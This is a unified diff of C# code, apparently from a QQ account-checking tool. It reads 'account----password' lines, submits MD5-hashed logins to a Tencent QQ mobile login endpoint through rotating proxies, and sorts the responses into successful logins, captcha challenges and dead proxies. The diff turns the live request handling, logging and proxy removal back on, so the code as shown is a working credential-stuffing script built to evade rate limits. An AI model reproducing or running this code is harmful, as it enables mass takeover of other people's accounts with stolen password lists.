@@ -48,7 +48,7 @@ namespace SM2014
             String[] details = Regex.Split(line, "----");
             String url = "http://pt.3g.qq.com/login?act=json&format=2&bid_code=house_touch&r=#" + "&qq=" + details[1] + "&pmd5=" + Util.UMD5X(details[2]) + "&go_url=http%3A%2F%2Fhouse60.3g.qq.com%2Ftouch%2Findex.jsp%3Fsid%3DAd_JZ1k2ZviFLkV2nvFt7005%26g_ut%3D3%26g_f%3D15124";
             
-            //Form1.GetInstance().Info("开始查询帐号:" + details[1]);
+            Form1.GetInstance().Info("开始查询帐号:" + details[1]);
 
             WebProxy wp = null;
 
@@ -76,20 +76,21 @@ namespace SM2014
                 //client.Headers.Add("User-Agent", Task.UAG);
                 String proxy = Form1.GetInstance().GetProxy();
                 //String proxy = "127.0.0.1:8888";
+
                 if (proxy == null)
                 {
                     flag = false;
                     continue;
                 }
 
-                //Form1.GetInstance().Info(details[1] + " -> " + proxy);
                 wp = new WebProxy(proxy);
+                Form1.GetInstance().Info(details[1] + " -> " + proxy);
                 //client.Proxy = wp;
                 //client.Encoding = Encoding.Default;
 
                 try
                 {
-                    url = url.Replace("#", Form1.RANDOM.NextDouble().ToString());
+                    //url = url.Replace("#", Form1.RANDOM.NextDouble().ToString());
 
                     request = (HttpWebRequest)WebRequest.Create(url);
                     request.Timeout = 1000 * timeout;
@@ -99,30 +100,27 @@ namespace SM2014
                     //Thread.Sleep(2000);
 
                     response = (HttpWebResponse)request.GetResponse();
-                    //stream = response.GetResponseStream();
-                    
-                    //if (stream != null)
-                    //{
-                    //    reader = new StreamReader(stream, System.Text.Encoding.UTF8);
-                    //    resp = reader.ReadToEnd();
-                    //}
-                    //else
-                    //{
-                    //    throw new Exception();
-                    //}
+
+                    //Console.WriteLine(Form1.RANDOM.Next(100) + Form1.RANDOM.Next(100));
+                    stream = response.GetResponseStream();
+
+                    if (stream != null)
+                    {
+                        reader = new StreamReader(stream, System.Text.Encoding.UTF8);
+                        resp = reader.ReadToEnd();
+                    }
+                    else
+                    {
+                        throw new Exception();
+                    }
 
                     wp = null;
 
-                    resp = "123";
-
-                    //stream = client.OpenRead(url);
-                    //reader = new StreamReader(stream);
-                    //resp = reader.ReadToEnd();
                     //resp = "123";
 
                     if (resp.IndexOf("pt.handleLoginResult") == -1)//代理异常
                     {
-                        //Form1.GetInstance().RemoveProxy(proxy);
+                        Form1.GetInstance().RemoveProxy(proxy);
                     }
                     else
                     {
@@ -144,23 +142,22 @@ namespace SM2014
                         }
                         else if (resp.IndexOf("," + details[1] + ",0,") != -1)//验证码
                         {
-                            //Form1.GetInstance().Queue(this.line);
+                            Form1.GetInstance().Queue(this.line);
 
                             //不离开当前任务
                             //Thread.Sleep(1000 * Int32.Parse(cfa.AppSettings.Settings["P_ITV"].Value));//N秒后继续
                         }
                         else //代理异常
                         {
-                            //Form1.GetInstance().RemoveProxy(proxy);
+                            Form1.GetInstance().RemoveProxy(proxy);
                         }
                     }
                 }
                 catch (Exception e)
                 {
                     //Console.WriteLine(e.Message);
-
                     //代理异常
-                    //Form1.GetInstance().RemoveProxy(proxy);
+                    Form1.GetInstance().RemoveProxy(proxy);
                 }
                 finally
                 {
